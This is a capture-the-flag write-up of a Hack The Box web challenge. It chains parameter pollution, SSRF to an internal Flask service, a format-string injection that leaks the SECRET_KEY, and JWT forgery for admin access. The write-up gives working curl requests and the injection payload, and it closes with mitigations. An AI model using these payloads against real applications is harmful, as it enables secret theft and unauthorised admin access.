published: 2026-1-10

description: The application allows users to submit a URL which is rendered by Selenium and saved as a PDF.  
However, multiple security flaws allow chaining **HPP + SSRF + Server-Side Template Injection** to extract the Flask `SECRET_KEY`, forge a JWT token, and access an admin-only endpoint to retrieve the flag.

tags: [HTB, HTB-Challenges]

category: Web-Challenges
## Challenge Summary

This challenge consists of two services:

1. **PHP Frontend** (`bartender.php`)
2. **Flask Backend API** (`app.py`)

The application allows users to submit a URL which is rendered by Selenium and saved as a PDF.  
However, multiple security flaws allow chaining **HPP + SSRF + Server-Side Template Injection** to extract the Flask `SECRET_KEY`, forge a JWT token, and access an admin-only endpoint to retrieve the flag.

---

## Architecture Overview

```
User → bartender.php → Flask API (/generate) → Selenium → PDF
                               ↓
                          SQLite Database
```

---

## Key Vulnerabilities Overview

| Component      | Vulnerability                         |
| -------------- | ------------------------------------- |
| bartender.php  | HTTP Parameter Pollution (HPP)        |
| app.py (/logs) | Server-Side Template Injection (SSTI) |
| app.py         | Weak URL validation                   |
| app.py         | JWT secret stored in Flask config     |
| Overall        | SSRF to internal Flask service        |
```
1. the trick
    
2. PHP check vs python check of the url
    
3. which is what you called Weak URL validation
    I think
    
    one takes the first, the other takes the last
    
    the php takes last parameter and flask take first parameter
```
---

## Step 1 – Understanding `bartender.php`

The PHP file accepts a GET request:

```php
/bartender.php?url=URL&name=NAME&secret=SECRET
```

### Important Observations

- It validates the URL using `no_way_trick_me()`
- Then forwards **the entire query string** to Flask:

```php
$final_url = $api_scraper.$_SERVER['QUERY_STRING']."&time=".$t;
```

❗ This means **duplicate parameters are not sanitized**.

---

## Step 2 – HTTP Parameter Pollution (HPP)

PHP reads **only the last `url` parameter**, but Flask (`request.args.get`) reads **the first one**.

So we can send:

```
url=PAYLOAD_URL&url=SAFE_URL
```

| Component | URL Used |
|---------|----------|
| PHP | SAFE_URL |
| Flask | PAYLOAD_URL |

This is the core bypass.

---

## Step 3 – Server-Side Template Injection in `/logs`

In `app.py`:

```python
def logify(rec):
    history = [f"ID: {row[0]} | URL: {row[1]} | Timestamp: {row[2]}" for row in rec]
    log = history_1.format(logify=logify)
    return log
```

The `.format()` call allows **Python format string injection**.

```
1. {logify.globals} -> shows you everything
```

### Payload Used

```text
{logify.__globals__[app].config[SECRET_KEY]}
```

This gives access to Flask’s `SECRET_KEY`.

---

## Step 4 – Injecting the Payload

The payload is injected inside a **URL fragment (#)**:

```text
https://example.com/#{logify.__globals__[app].config[SECRET_KEY]}
```

Why this works:
- DNS & URL validation ignore fragments
- Selenium saves the URL into the database
- `/logs` renders it using `.format()`

### Curl Injection Request

```bash
curl -G "http://TARGET/bartender.php" \
  --data-urlencode "url=https://example.com/#{logify.__globals__[app].config[SECRET_KEY]}" \
  --data-urlencode "url=http://example.com/" \
  --data-urlencode "name=test" \
  --data-urlencode "secret=test"
```

---

## Step 5 – Triggering SSRF to `/logs`

Now we force Selenium to visit the internal Flask service:

```text
http://127.0.0.1:5000/logs
```

### Curl Trigger

```bash
curl -G "http://TARGET/bartender.php" \
  --data-urlencode "url=http://127.0.0.1:5000/logs" \
  --data-urlencode "url=http://example.com/" \
  --data-urlencode "name=test" \
  --data-urlencode "secret=test"
```

The generated PDF contains the leaked `SECRET_KEY`.

---

## Step 6 – Forging Admin JWT

From `app.py`:

```python
jwt.decode(token, app.config['SECRET_KEY'], algorithms=["HS256"])
```

We now forge a token using **HS256**.

### JWT Payload

```json
{
  "username": "admin",
  "is_admin": true
}
```

Using the leaked `SECRET_KEY`, we generate a valid JWT.

---

## Step 7 – Accessing Admin Endpoint

Admin-only endpoint:

```python
@app.route('/bartender')
@token_required
```

### Final Request

```text
http://TARGET:5000/bartender?token=FORGED_JWT


curl -i -G "http://94.237.63.174:40543/bartender.php"   --data-urlencode "url=http://127.0.0.1:5000/bartender?token=JWT-HERE"   --data-urlencode "url=http://example.com/"
```

This returns the secrets table, including the **flag**.

---

## Root Cause Analysis

| Issue | Description |
|----|------------|
| HPP | Duplicate URL parameters not sanitized |
| SSTI | Unsafe use of `.format()` |
| SSRF | Selenium allowed internal access |
| JWT | Secret key leaked & reused |

---

## Mitigations

- Reject duplicate parameters
- Never use `.format()` on user data
- Block internal IP access in Selenium
- Rotate JWT secrets and store securely

---


